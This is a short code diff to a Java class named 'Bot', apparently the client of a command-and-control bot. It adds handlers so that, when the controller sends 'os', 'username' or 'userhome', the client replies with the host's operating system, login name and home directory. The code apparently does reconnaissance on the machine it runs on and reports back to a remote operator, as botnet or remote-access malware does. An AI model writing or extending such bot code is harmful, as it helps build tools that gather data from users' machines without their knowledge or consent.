@@ -82,8 +82,14 @@ public class Bot {
 						sendCommand("ping_ok-"+list.get(0).toString(), address);
 						break;
 					case "os":
-						sendCommand(System.getProperty("os.name"), address);
-
+						sendCommand("os-"+list.get(0).toString()+"-"+System.getProperty("os.name"), address);
+                        break;
+					case "username":
+						sendCommand("username-"+list.get(0).toString()+"-"+System.getProperty("user.name"),address);
+						break;
+					case "userhome":
+						sendCommand("userhome-"+list.get(0).toString()+"-"+System.getProperty("user.home"),address);
+						break;
 					default:
 						break;
 					}
@@ -205,7 +211,6 @@ public class Bot {
 			e.printStackTrace();
 		}
     }
-
     */
     
 }
